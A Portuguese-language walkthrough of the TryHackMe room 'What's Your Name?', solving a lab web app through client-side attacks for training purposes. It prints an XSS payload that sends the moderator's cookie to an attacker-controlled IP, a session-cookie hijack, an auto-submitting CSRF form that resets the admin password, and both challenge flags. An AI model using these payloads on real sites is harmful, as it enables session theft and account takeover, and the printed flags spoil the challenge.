# TryHackMe - What's Your Name?

###### Solved by @milelaraia

Esta é uma sala do TryHackMe que apresenta um desafio com duas perguntas envolvendo vulnerabilidades web.

## Enunciado do Desafio

Este desafio vai testar habilidades de exploração pelo lado do cliente, desde inspecionar JavaScript até manipular cookies e lançar ataques CSRF/XSS. Para iniciar a máquina virtual, clique no botão Start Machine no canto superior direito da tarefa.

Você encontrará todas as ferramentas necessárias para completar o desafio, como Nmap, shells em PHP e muitas outras, no AttackBox. Além disso, adicione o hostname worldwap.thm ao arquivo hosts.

## Primeiros Passos

Temos dois objetivos no desafio, um deles é conseguir as `credenciais de moderador` do site e o outro é acessar o prório `painel de admin`.

Primeirante, vamos adicionar o nosso hostname `worldwap.thm` ao arquivo de hosts usando o comando abaixo:

```bash
nano /etc/hosts
```
[![Captura-de-tela-2025-11-27-220110.png](https://i.postimg.cc/XNKx3ZZf/Captura-de-tela-2025-11-27-220110.png)](https://postimg.cc/V56XWkWv)

Feito isso, conseguimos acessar o site pelo navegador usando o URL `worldwap.thm`.

[![imagem-2025-11-27-221108863.png](https://i.postimg.cc/nL7Bk5B7/imagem-2025-11-27-221108863.png)](https://postimg.cc/7CH5PKBY)

Conseguimos ter acesso a página de registros do site:

[![imagem-2025-11-27-221450452.png](https://i.postimg.cc/zf1VJfH9/imagem-2025-11-27-221450452.png)](https://postimg.cc/k2fnsqcc)

Vale ressaltar que há uma frase nessa aba que diz que os detalhes do usuário serão revisados pelo moderador do site.

Quando criamos um registro no site, somos redirecionados para a seguinte página:

[![imagem-2025-11-27-222015582.png](https://i.postimg.cc/W1VdV3kK/imagem-2025-11-27-222015582.png)](https://postimg.cc/Lny9BmvB)

É solicitado que acessemos a página `login.worldwap.thm` para fazermos o login.

*Vamos fazer o mesmo processo de adicionar o domínio na lista de hosts, já que ao tentarmos fazer o login aparece uma mensagem dizendo: Usuário não verificado.

Temos acesso à uma página em branco.

[![imagem-2025-11-27-222614504.png](https://i.postimg.cc/vZTpc7fW/imagem-2025-11-27-222614504.png)](https://postimg.cc/ts0rcxrT)

Porém ao acessar o `código fonte` usando o `View Page Source` achamos o seguinte:

[![imagem-2025-11-27-222953516.png](https://i.postimg.cc/mZdjhvwp/imagem-2025-11-27-222953516.png)](https://postimg.cc/RqHKDb2w)

A mensagem diz: “login.php deve ser atualizado até segunda-feira para redirecionar corretamente". 

Com isso devemos ajustar a URL para `login.worldwap.thm/login.php` e assim conseguir acessar a página de login.

[![imagem-2025-11-27-223402835.png](https://i.postimg.cc/9M94VqJG/imagem-2025-11-27-223402835.png)](https://postimg.cc/ph2VJyNT)

## Análises de possíveis vulnerabilidades

Após quebrar um pouco a cabeça, tentamos usufruir de uma vulnerabilidade chamada XSS, e para isso iremos utilizar o seguinte script na página de registros:

```bash]
<script>alert(1)</script>
```
A mensagem de alerta esperada não aparece, porém o site também não apresenta nenhum erro ao inserir o script, o que representa que o ataque é possível.

[![imagem-2025-11-27-224742952.png](https://i.postimg.cc/CLgc3GmQ/imagem-2025-11-27-224742952.png)](https://postimg.cc/fk87X94c)

Além disso devemos lembrar da mensagem que aparece na página, o que significa que o script injetado foi enviado para o moderador.

#### Criando um Script para a primeira flag

Vamos montar um script para conseguir capturar o `cookie` do moderador, já que o `XSS` é injetado diretamente na sessão do mesmo.

```bash
<script>new Image().src='http://10.64.85.124:8000/?c='+document.cookie</script>
```

Importante ressaltar que devemos também criar um ambiente usando o `Python` para capturar as nossas requisições.

```bash
python3 -m http.server 8000
```
[![imagem-2025-11-27-234726004.png](https://i.postimg.cc/pLSvJVHT/imagem-2025-11-27-234726004.png)](https://postimg.cc/nXqNHJMb)

Com o cookie capturado, vamos agora gerar um outro script para injetar no `console` da página de login e conseguir acessar a aba do moderador.

```bash
document.cookie="PHPSESSID=k7iuveur8c7kjss6o56nlh4810; path=/; domain=.worldwap.thm";
location.reload();
```
Usando o `location.reload();` ele já recarrega a página automaticamente, nos levando à página de moderador, e assim, a primeira flag.

[![imagem-2025-11-27-235205640.png](https://i.postimg.cc/q7GLdqvz/imagem-2025-11-27-235205640.png)](https://postimg.cc/3ydpXKpT)

```bash
Flag: ModP@wnEd
```
## Análise de vulnerabilidades no painel de Moderador

Na aba de moderador, temos acesso à um chat, nele podemos ver que há uma conversa com um `Admin Bot`.

[![imagem-2025-11-28-001043386.png](https://i.postimg.cc/BbNTdVSN/imagem-2025-11-28-001043386.png)](https://postimg.cc/1VnVFMNN)

Ao enviar um link para o bot admin, percebemos no servidor python que ainda está rodando, que ele acessa o link enviando.



Percebemos também que há uma área de `Change Password` o que nos leva a pensar que o site pode ser vulnerávela `CSRF`.

Vamos montar um exploit baseado no html do nosso Change Password e salvar em um arquivo chamado `csrf.html`:

```bash
<html>
  <body>
    <form action="http://login.worldwap.thm/change_password.php" method="POST">
      <input type="hidden" name="new_password" value="daora">
      <input type="submit" value="Mudar Senha">
    </form>
    
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Depois vamos enviar no chat o link malicioso:

```bash
http://10.64.85.124:8000/csrf.html
```
Pelo servidor python percebemos que o ataque funcionou, já que retornou `200`:
 
[![Captura-de-tela-2025-11-28-132857.png](https://i.postimg.cc/BbRB6jzr/Captura-de-tela-2025-11-28-132857.png)](https://postimg.cc/T5qDN3f0)


Dessa maneira, é só acessar o painel de admin utilizando as credenciais, username: `Admin`, password: `daora`.

[![Captura-de-tela-2025-11-28-132949.png](https://i.postimg.cc/SsJZxbsh/Captura-de-tela-2025-11-28-132949.png)](https://postimg.cc/Hc106KXZ)

```bash
Flag: AdM!nP@wnEd
```

## Conclusão

O desafio mostrou, na prática, como falhas simples (como XSS e CSRF) podem comprometer totalmente um sistema web. Ao explorar entradas sem sanitização, manipular cookies e abusar do processamento automático feito pelo moderador e pelo admin bot, foi possível escalar privilégios e acessar ambos os painéis.

Esse tipo de estudo é muito útil no dia a dia porque essas vulnerabilidades ainda aparecem com frequência em aplicações reais. Entender como elas funcionam ajuda a identificar problemas durante testes de segurança, corrigir código de forma mais consciente e prevenir ataques semelhantes em ambientes corporativos. Em resumo, a prática dessa sala reflete exatamente o tipo de cenário que um profissional de segurança enfrenta no mundo real.

